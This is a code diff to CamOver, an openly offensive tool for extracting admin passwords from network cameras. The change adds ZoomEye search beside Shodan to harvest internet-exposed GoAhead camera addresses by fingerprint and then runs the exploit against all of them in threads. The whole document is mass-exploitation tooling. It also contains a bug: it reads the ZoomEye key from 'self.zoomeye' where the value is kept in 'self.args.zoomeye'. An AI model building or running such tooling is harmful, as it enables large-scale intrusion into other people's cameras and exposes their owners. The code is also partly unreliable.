@@ -27,6 +27,7 @@
 import os
 import argparse
 import threading
+import requests
 
 from shodan import Shodan
 from time import sleep as thread_delay
@@ -36,6 +37,7 @@ from .badges import Badges
 
 
 class CamOverCLI(CamOver, Badges):
+    threads = list()
     thread_delay = 0.1
 
     description = "CamOver is a camera exploitation tool that allows to disclosure network camera admin password."
@@ -44,7 +46,9 @@ class CamOverCLI(CamOver, Badges):
     parser.add_argument('-o', '--output', dest='output', help='Output result to file.')
     parser.add_argument('-i', '--input', dest='input', help='Input file of addresses.')
     parser.add_argument('-a', '--address', dest='address', help='Single address.')
-    parser.add_argument('--api', dest='api', help='Shodan API key for exploiting devices over Internet.')
+    parser.add_argument('--shodan', dest='shodan', help='Shodan API key for exploiting devices over Internet.')
+    parser.add_argument('--zoomeye', dest='zoomeye', help='ZoomEye API key for exploiting devices over Internet.')
+    parser.add_argument('-p', '--pages', dest='pages', type=int, help='Number of pages you want to get from ZoomEye.')
     args = parser.parse_args()
 
     def thread(self, address):
@@ -58,17 +62,72 @@ class CamOverCLI(CamOver, Badges):
                 with open(self.args.output, 'a') as f:
                     f.write(f"{result}\n")
 
-    def start(self):
+    def crack(self, addresses):
         line = "/-\|"
         counter = 0
 
-        if self.args.threads:
-            threads = list()
+        for address in addresses:
+            if counter >= len(line):
+                counter = 0
+            self.print_process(f"Exploiting... ({address}) {line[counter]}", end='')
 
-        if self.args.api:
+            if not self.args.threads:
+                self.thread(address)
+            else:
+                thread_delay(self.thread_delay)
+                thread = threading.Thread(target=self.thread, args=[address])
+
+                thread.start()
+                self.threads.append(thread)
+            counter += 1
+
+    def clean_up(self):
+        line = "/-\|"
+        counter = 0
+
+        for thread in self.threads:
+            if counter >= len(line):
+                counter = 0
+            self.print_process(f"Cleaning up... {line[counter]}", end='')
+
+            if thread.is_alive():
+                thread.join()
+            counter += 1
+        
+    def start(self):
+        if self.args.zoomeye:
+            self.print_process("Authorizing ZoomEye by given API key...")
+            try:
+                zoomeye = 'https://api.zoomeye.org/host/search?query=GoAhead 5ccc069c403ebaf9f0171e9517f40e41&page='
+                zoomeye_header = {
+                    'Authorization': f'JWT {self.zoomeye}'
+                }
+                addresses = list()
+
+                if self.args.pages:
+                    pages = int(self.args.pages)
+                else:
+                    pages = 100
+                pages, page = divmod(pages, 20)
+                if page != 0:
+                    pages += 1
+
+                for page in range(1, pages + 1):
+                    results = requests.get(zoomeye + str(page), headers=zoomeye_header).json()
+                    if not len(results['matches']):
+                        self.print_error("Failed to authorize ZoomEye!")
+                        return
+                    for address in results['matches']:
+                        addresses.append(address['ip'] + ':' + str(address['portinfo']['port']))
+            except Exception:
+                self.print_error("Failed to authorize ZoomEye!")
+                return
+            self.crack(addresses)
+
+        elif self.args.shodan:
             self.print_process("Authorizing Shodan by given API key...")
             try:
-                shodan = Shodan(self.args.api)
+                shodan = Shodan(self.args.shodan)
                 results = shodan.search(query='GoAhead 5ccc069c403ebaf9f0171e9517f40e41')
                 addresses = list()
                 for result in results['matches']:
@@ -77,21 +136,7 @@ class CamOverCLI(CamOver, Badges):
                 self.print_error("Failed to authorize Shodan!")
                 return
             self.print_success("Authorization successfully completed!")
-
-            for address in addresses:
-                if counter >= len(line):
-                    counter = 0
-                self.print_process(f"Exploiting... ({address}) {line[counter]}")
-
-                if not self.args.threads:
-                    self.thread(address)
-                else:
-                    thread_delay(self.thread_delay)
-                    thread = threading.Thread(target=self.thread, args=[address])
-
-                    thread.start()
-                    threads.append(thread)
-                counter += 1
+            self.crack(addresses)
 
         elif self.args.input:
             if not os.path.exists(self.args.input):
@@ -100,39 +145,17 @@ class CamOverCLI(CamOver, Badges):
 
             with open(self.args.input, 'r') as f:
                 addresses = f.read().strip().split('\n')
-
-                for address in addresses:
-                    if counter >= len(line):
-                        counter = 0
-                    self.print_process(f"Exploiting... ({address}) {line[counter]}", end='')
-
-                    if not self.args.threads:
-                        self.thread(address)
-                    else:
-                        thread_delay(self.thread_delay)
-                        thread = threading.Thread(target=self.thread, args=[address])
-
-                        thread.start()
-                        threads.append(thread)
-                    counter += 1
+                self.crack(addresses)
 
         elif self.args.address:
             self.print_process(f"Exploiting {self.args.address}...")
             self.thread(self.args.address)
+
         else:
             self.parser.print_help()
+            return
 
-        if self.args.threads:
-            counter = 0
-
-            for thread in threads:
-                if counter >= len(line):
-                    counter = 0
-                self.print_process(f"Cleaning up... {line[counter]}", end='')
-
-                if thread.is_alive():
-                    thread.join()
-                counter += 1
+        self.clean_up()
         self.print_empty(end='')
 
 def main():
